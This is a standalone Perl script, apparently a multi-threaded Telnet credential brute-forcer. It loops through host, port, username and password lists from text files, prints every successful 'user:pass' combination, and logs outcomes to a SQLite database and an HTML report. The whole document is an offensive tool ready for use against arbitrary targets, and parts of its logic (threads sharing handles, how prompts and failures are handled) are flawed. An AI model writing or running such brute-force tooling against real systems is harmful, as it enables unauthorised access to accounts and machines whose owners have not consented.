use strict;
use warnings;
use Net::Telnet;
use DBI;
use threads; # For multi-threading

my $db_file = "scan_results.db";  # SQLite database file
my $report_file = "report.html";

# Initialize SQLite database
my $dbh = DBI->connect("dbi:SQLite:dbname=$db_file", "", "", { RaiseError => 1, AutoCommit => 1 });
$dbh->do("CREATE TABLE IF NOT EXISTS scan_results (host TEXT, port INTEGER, status TEXT, PRIMARY KEY (host, port))");

# Initialize HTML report
open my $report, '>', $report_file;
print $report "<html><body><table><tr><th>Host</th><th>Port</th><th>Status</th></tr>";

# Define target hosts, ports, and user/pass lists
my @hosts = read_file_into_array("hosts.txt");
my @ports = read_file_into_array("ports.txt");
my @users = read_file_into_array("user.txt");
my @passwords = read_file_into_array("pass.txt");

# Multi-threading setup
my @threads;
my $max_threads = 10; # Maximum concurrent threads

foreach my $host (@hosts) {
    foreach my $port (@ports) {
        while (1) {
            if (scalar(threads->list(threads::running)) < $max_threads) {
                my $thread = threads->create(\&check_login, $host, $port);
                push @threads, $thread;
                last;
            } else {
                sleep(1);
            }
        }
    }
}

# Wait for all threads to finish
$_->join for @threads;

# Finish HTML report
print $report "</table></body></html>";
close $report;

# Clean up
$dbh->disconnect();

sub check_login {
    my ($host, $port) = @_;

    my $telnet = Net::Telnet->new(Timeout => 10);
    $telnet->open(Host => $host, Port => $port);

    if ($telnet->waitfor('/login: /i')) {
        foreach my $user (@users) {
            foreach my $pass (@passwords) {
                $telnet->print($user);
                $telnet->waitfor('/password: /i');
                $telnet->print($pass);

                if ($telnet->waitfor('/login successful/i')) {
                    print "Login successful on $host:$port with $user:$pass\n";

                    # Save the result to the SQLite database
                    my $sth = $dbh->prepare("INSERT OR REPLACE INTO scan_results (host, port, status) VALUES (?, ?, ?)");
                    $sth->execute($host, $port, "Success");

                    # Log the result in the HTML report
                    print $report "<tr><td>$host</td><td>$port</td><td>Success</td></tr>";

                    last;  # Break out of password loop
                }
            }
        }
    } else {
        # Save the result to the SQLite database
        my $sth = $dbh->prepare("INSERT OR REPLACE INTO scan_results (host, port, status) VALUES (?, ?, ?)");
        $sth->execute($host, $port, "Failure");

        # Log the result in the HTML report
        print $report "<tr><td>$host</td><td>$port</td><td>Failure</td></tr>";
    }

    $telnet->close;
}

sub read_file_into_array {
    my ($file) = @_;
    open my $fh, '<', $file or die "Could not open file '$file' $!";
    my @lines = <$fh>;
    chomp @lines;
    close $fh;
    return @lines;
}
